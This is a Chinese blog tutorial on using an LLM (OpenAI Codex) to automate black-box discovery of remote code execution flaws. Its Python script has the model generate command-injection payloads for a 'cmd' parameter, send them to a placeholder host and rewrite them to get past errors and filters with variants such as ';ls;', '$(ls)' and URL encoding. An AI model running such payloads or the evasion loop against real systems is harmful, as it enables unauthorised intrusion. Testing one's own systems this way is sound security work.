#  基于大模型（LLM）的黑盒RCE漏洞挖掘   
原创 比心皮卡丘  暴暴的皮卡丘   2025-01-11 09:00  
  
简介  
  
远程代码执行（Remote Code Execution，RCE）漏洞是最危险的网络安全漏洞之一，攻击者可以通过此类漏洞远程执行任意代码，进而控制目标系统。由于RCE漏洞的危害性极大，因此发现和修复这些漏洞是网络安全领域的重要任务。传统的漏洞挖掘方法依赖于手动渗透测试和静态分析，效率较低且依赖于安全专家的经验。近年来，大语言模型（LLM）技术，尤其是如OpenAI Codex等模型的出现，为自动化漏洞挖掘提供了新的思路和方法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/kJNsfULMnLUPQpw6gXLVD5CiaoHBGScQVdaEGWtOw5Y3jxvcJFDv1tVEJMNt3ohw31fibS0NicFODRE6YoNOkibScw/640?wx_fmt=other&from=appmsg "")  
### 黑盒漏洞挖掘  
  
黑盒测试（Black-box Testing）是一种不依赖于目标系统内部实现的测试方法，测试人员仅通过外部接口与系统交互，模拟攻击者的行为来发现潜在漏洞。黑盒漏洞挖掘通常依赖于输入数据生成（如恶意HTTP请求、文件上传等），并通过系统的响应来判断是否存在漏洞。  
  
在RCE漏洞的黑盒挖掘中，攻击者通过提交恶意输入数据（如构造恶意文件上传、注入恶意命令等）来测试系统是否能被远程控制。由于黑盒测试不依赖系统的源代码，因此它能够模拟真实攻击者的攻击方式，评估系统的安全性。  
  
## 大模型（LLM）在黑盒RCE漏洞挖掘应用  
  
在黑盒漏洞挖掘中，LLM可以自动化生成恶意请求，模拟攻击者行为，检验系统是否能够正确处理这些输入。LLM不仅可以生成常见的攻击payload（如SQL注入、XSS、RCE等），还能够根据目标系统的特征动态调整攻击策略。  
### 技术实现  
- **使用LLM生成恶意payload**  
：LLM根据目标应用的接口或功能生成攻击payload。例如，在Web应用中，LLM可以生成恶意的HTTP请求，包含命令注入、文件上传、路径遍历等攻击。  
  
- **自动化测试**  
：LLM与目标系统进行交互，自动化提交请求，分析系统的响应。如果系统的响应表明存在异常行为（如执行了注入的命令），则判定为存在漏洞。  
  
- **智能化反馈**  
：LLM能够根据系统响应分析攻击效果，进一步调整生成的payload，优化漏洞检测的准确性。  
  
  
### 代码实现  
  
假设目标系统提供一个cmd  
参数，攻击者可以通过该参数执行任意系统命令。我们将通过LLM生成一个命令注入payload，并尝试触发RCE漏洞。  
  
  
```
import openai
import requests
# 设置OpenAI API密钥
openai.api_key = "your-api-key"
# 目标URL
target_url = "http://example.com/api/execute_command"
# 目标API接口描述
api_description = """
这是一个API接口，允许用户通过'cmd'参数执行系统命令。用户输入的命令没有进行任何过滤。请分析此接口是否存在RCE漏洞，并生成攻击payload。
"""
# 使用LLM生成攻击payload
def generate_payload(api_description):
    prompt = f"""
    根据以下API接口描述，生成恶意输入或者攻击payload：
    {api_description}
    攻击目标是远程命令执行（RCE），请生成一个可以执行'ls'命令并返回结果的payload。
    """
    
    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型进行生成
        prompt=prompt,
        max_tokens=150,
        temperature=0.7
    )
    payload = response.choices[0].text.strip()
    return payload
# 发起攻击并测试RCE漏洞
def test_rce_vulnerability(target_url, api_description):
    payload = generate_payload(api_description)
    params = {"cmd": payload}
    try:
        response = requests.get(target_url, params=params)
        if response.status_code == 200:
            print(f"请求成功，正在分析响应：{response.text}")
            # 使用LLM分析响应
            analyze_response_for_rce(response.text)
        else:
            print("未发现RCE漏洞")
    except requests.exceptions.RequestException as e:
        print(f"请求失败：{e}")
# 使用LLM分析响应并判断是否存在RCE
def analyze_response_for_rce(response_text):
    prompt = f"""
    下面是目标系统的响应内容，请分析是否存在RCE漏洞：
    {response_text}
    如果存在RCE漏洞，请说明漏洞原因，并提供修复建议。
    """
    
    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型进行分析
        prompt=prompt,
        max_tokens=200,
        temperature=0.5
    )
    analysis_result = response.choices[0].text.strip()
    print("LLM分析结果：")
    print(analysis_result)
# 运行测试
test_rce_vulnerability(target_url, api_description)
```  
  
  
#### 代码阐述  
1. **generate_payload()**  
：通过LLM根据接口描述生成恶意的cmd  
参数值（例如，执行ls  
命令）。LLM会根据目标接口的特点（如命令执行接口）生成特定的攻击payload。  
  
1. **test_rce_vulnerability()**  
：通过HTTP GET请求发送包含恶意payload的cmd  
参数，并获取目标系统的响应。  
  
1. **analyze_response_for_rce()**  
：使用LLM对系统的响应内容进行分析，判断是否存在远程代码执行（RCE）漏洞。如果响应中包含命令输出或异常信息（如ls  
命令的输出），则说明可能存在RCE漏洞。  
  
###   
### 实战示例  
  
假设我们给定一个目标系统，其中cmd  
参数未进行验证。目标系统在接受到如下请求时会执行传入的命令：  
  
```
GET http://example.com/api/execute_command?cmd=ls
```  
  
如果系统返回类似ls  
命令的目录列表，则表明目标系统存在RCE漏洞。LLM将通过分析返回的文本（如返回的目录列表或错误信息）来得出是否存在漏洞的结论。  
  
例如，假设响应是：  
  
```
bin  boot  etc  home  lib  lib64  opt  root  sbin  usr
```  
  
LLM的分析结果可能是：  
  
```
LLM分析结果：
该响应表明命令'ls'被成功执行，系统可能存在远程命令执行（RCE）漏洞。攻击者可以利用此漏洞执行任意命令，造成严重安全风险。建议修复方法：对'cmd'参数进行严格的输入验证，防止用户输入恶意命令。
```  
  
### 自适应攻击和反馈机制  
  
LLM不仅能够生成初步的攻击payload，还能够根据系统的反馈（如响应内容、错误信息等）调整攻击策略。例如，如果初次攻击没有成功，LLM可以调整payload，尝试其他命令或输入，直到触发漏洞或找到更有效的攻击方式。  
#### 示例：自适应攻击  
  
假设目标系统返回错误信息而不是预期的命令输出  
  
```
Error: command not found
```  
  
LLM可以分析错误信息并提出调整策略，生成更有针对性的payload，避免简单的命令注入攻击。  
  
```
def adjust_payload_based_on_feedback(response_text):
    prompt = f"""
    目标系统返回以下错误信息：{response_text}
    请分析此错误并生成新的攻击payload，以尝试绕过错误并触发RCE漏洞。
    """
    
    response = openai.Completion.create(
        model="code-davinci-002",  # 使用Codex模型进行分析
        prompt=prompt,
        max_tokens=150,
        temperature=0.7
    )
    adjusted_payload = response.choices[0].text.strip()
    print("LLM调整后的攻击payload：", adjusted_payload)
    return adjusted_payload
```  
  
  
  
#### 改进点与完善逻辑  
##### 1. 自适应攻击  
- 初始攻击策略是通过generate_payload  
函数生成简单的攻击payload，如cmd=ls  
。  
  
- 如果攻击失败或系统未返回预期结果，脚本会调用adjust_payload_based_on_feedback  
，让LLM根据反馈调整攻击策略。 例如：  
  
- 初始命令未被解析：调整为cmd=$(ls)  
或cmd=;ls;  
。  
  
- 如果需要绕过简单的输入过滤：调整为混淆payload或加入URL编码。  
  
##### 2. LLM响应分析  
- 通过analyze_response_for_rce  
函数，LLM会从目标系统的HTTP响应中提取关键信息，例如：  
  
- 是否包含命令的输出（如文件列表、路径信息等）。  
  
- 是否返回错误提示，表明命令未被正确解析。  
  
- 如果LLM判断系统可能存在漏洞，则返回成功的结论。  
  
##### 3. 迭代优化  
- 脚本设计了最大尝试次数（如5次），每次都会基于前次响应调整攻击策略，避免单一的攻击模式。  
  
- 通过自适应机制，能够模拟攻击者的多次尝试行为，提高漏洞检测的成功率。  
  
  
##### 4. 执行流程  
1. 调用LLM生成初始payload。  
  
1. 通过HTTP请求向目标系统发送payload。  
  
1. 分析响应：  
  
1. 如果检测到漏洞，则终止并输出结果。  
  
1. 如果未检测到漏洞，则基于响应调整payload。  
  
1. 重复上述步骤，直到发现漏洞或尝试次数用尽。  
  
#### 运行结果示例  
  
**成功触发漏洞：**  
  
```
[尝试第 1 次] 使用payload: ls
响应状态码: 200
响应内容: bin  boot  etc  home  lib  lib64
LLM分析结果：
该响应表明命令'ls'被成功执行，系统存在远程命令执行（RCE）漏洞。
建议修复方法：对'cmd'参数进行严格输入验证，或使用白名单限制可执行的命令。
检测到RCE漏洞！
```  
  
**失败后调整策略：**  
  
```
[尝试第 1 次] 使用payload: ls
响应状态码: 200
响应内容: Error: command not found
未检测到漏洞，尝试调整攻击策略...
调整后的payload: ;ls;
[尝试第 2 次] 使用payload: ;ls;
响应状态码: 200
响应内容: bin  boot  etc  home
LLM分析结果：
该响应表明命令'ls'被成功执行，系统存在远程命令执行（RCE）漏洞。
检测到RCE漏洞！
```  
  
  
  
  
  
